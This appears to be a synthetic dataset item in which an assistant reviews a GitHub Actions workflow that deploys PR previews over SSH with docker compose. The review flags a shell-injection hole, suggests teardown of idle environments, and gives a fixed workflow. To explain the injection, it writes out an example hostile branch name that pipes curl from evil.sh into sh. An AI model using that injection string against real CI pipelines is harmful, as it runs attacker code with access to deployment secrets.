@@ -1,0 +1,129 @@
+id: gen-1-00252-review
+category: review
+language: yaml
+patterns:
+- minimize-environments
+facts:
+- F-PREVIEW-ENV
+messages:
+- role: user
+  content: |
+    hello, we have small CLI tool "dbsync" and it has also a little web dashboard (api). For every pull request we make a preview on our preview VM with docker compose (services: api, postgres, redis, worker). Can you review this github workflow? my english is not so good sorry
+
+    ```yaml
+    name: PR preview
+
+    on:
+      pull_request:
+        branches: [main]
+
+    jobs:
+      preview:
+        runs-on: ubuntu-latest
+        env:
+          HOST: preview.dbsync.example.com
+          IMAGE: registry.dbsync.example.com/dbsync
+        steps:
+          - uses: actions/checkout@v4
+
+          - name: Setup ssh
+            run: |
+              mkdir -p ~/.ssh
+              echo "${{ secrets.PREVIEW_SSH_KEY }}" > ~/.ssh/id_ed25519
+              chmod 600 ~/.ssh/id_ed25519
+              ssh-keyscan $HOST >> ~/.ssh/known_hosts
+
+          - name: Build and push image
+            run: |
+              docker build -t $IMAGE:${{ github.sha }} .
+              docker push $IMAGE:${{ github.sha }}
+
+          - name: Deploy preview
+            run: |
+              NAME=$(echo "${{ github.head_ref }}" | tr '/' '-')
+              ssh deploy@$HOST "cd /srv/previews && IMAGE_TAG=${{ github.sha }} docker compose -p pr-$NAME up -d --scale api=3"
+              echo "Preview ready: https://$NAME.preview.dbsync.example.com"
+    ```
+- role: assistant
+  content: |
+    **Workload:** cloud backend (CI/CD with preview environments)
+
+    #### [Security] Branch name is pasted into a shell script
+    - **Where:** `NAME=$(echo "${{ github.head_ref }}" | tr '/' '-')`
+    - **Issue:** `${{ ... }}` is replaced before the shell runs. The branch name is chosen by the PR author. A branch name like `x"; curl evil.sh | sh; "` runs code in your job, which has access to `PREVIEW_SSH_KEY`. Branch names with other special characters also break the compose project name.
+    - **Fix:** do not use the branch name. Use the PR number, which is safe and unique.
+
+    #### [High] Preview environments are never removed
+    - **Where:** `on: pull_request` has no `closed` event, and there is no teardown step
+    - **Issue:** every PR starts a stack of 3 API replicas, Postgres, Redis and a worker, and it keeps running after the PR is merged or closed. The VM fills up with dead environments. Each one holds memory, disk and images for as long as nobody removes it.
+    - **Fix:** run a teardown job when the PR is closed (see the full workflow below).
+    - **Impact:** reduces E and M. Idle services cost little per minute: in Green Metrics Tool micro-benchmarks, a preview idling for 60 seconds used about 3% less CPU energy with 1 app replica and Postgres than with 3 replicas, Postgres, Redis and a worker. The real saving is in hours: an environment that is removed on close stops costing anything.
+
+    #### [Medium] Full stack for every preview
+    - **Where:** `up -d --scale api=3`
+    - **Issue:** a preview is for one reviewer. Three replicas give no extra value there. Redis and the worker are only needed if the PR touches them.
+    - **Fix:** start one replica. If the PR does not need Redis and the worker, name only `api postgres`. Keep the full stack for the shared staging environment.
+    - **Impact:** reduces M (reserved memory) more than energy. The idle CPU difference is small.
+
+    ```yaml
+    name: PR preview
+
+    on:
+      pull_request:
+        branches: [main]
+        types: [opened, synchronize, reopened, closed]
+
+    env:
+      HOST: preview.dbsync.example.com
+      IMAGE: registry.dbsync.example.com/dbsync
+      PROJECT: pr-${{ github.event.number }}
+
+    jobs:
+      deploy:
+        if: github.event.action != 'closed'
+        runs-on: ubuntu-latest
+        steps:
+          - uses: actions/checkout@v4
+
+          - name: Setup ssh
+            env:
+              SSH_KEY: ${{ secrets.PREVIEW_SSH_KEY }}
+            run: |
+              mkdir -p ~/.ssh
+              printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
+              chmod 600 ~/.ssh/id_ed25519
+              ssh-keyscan "$HOST" >> ~/.ssh/known_hosts
+
+          - name: Build and push image
+            run: |
+              docker build -t "$IMAGE:$GITHUB_SHA" .
+              docker push "$IMAGE:$GITHUB_SHA"
+
+          - name: Deploy preview
+            run: |
+              ssh "deploy@$HOST" "cd /srv/previews && IMAGE_TAG=$GITHUB_SHA docker compose -p $PROJECT up -d --scale api=1 api postgres"
+              echo "Preview ready: https://$PROJECT.preview.dbsync.example.com"
+
+      teardown:
+        if: github.event.action == 'closed'
+        runs-on: ubuntu-latest
+        steps:
+          - name: Setup ssh
+            env:
+              SSH_KEY: ${{ secrets.PREVIEW_SSH_KEY }}
+            run: |
+              mkdir -p ~/.ssh
+              printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
+              chmod 600 ~/.ssh/id_ed25519
+              ssh-keyscan "$HOST" >> ~/.ssh/known_hosts
+
+          - name: Remove preview
+            run: |
+              ssh "deploy@$HOST" "cd /srv/previews && docker compose -p $PROJECT down --volumes --rmi local"
+    ```
+
+    The preview URL now uses `pr-<number>` instead of the branch name. Old previews that are already on the VM are not removed by this change. List them with `docker compose ls` and run `down` on the ones whose PR is closed.
+
+    **Already good:** the image is tagged with the commit SHA, so each deploy is traceable. The SSH key file has `chmod 600`.
+verify:
+  static_only: needs GitHub Actions, an SSH preview host and a container registry
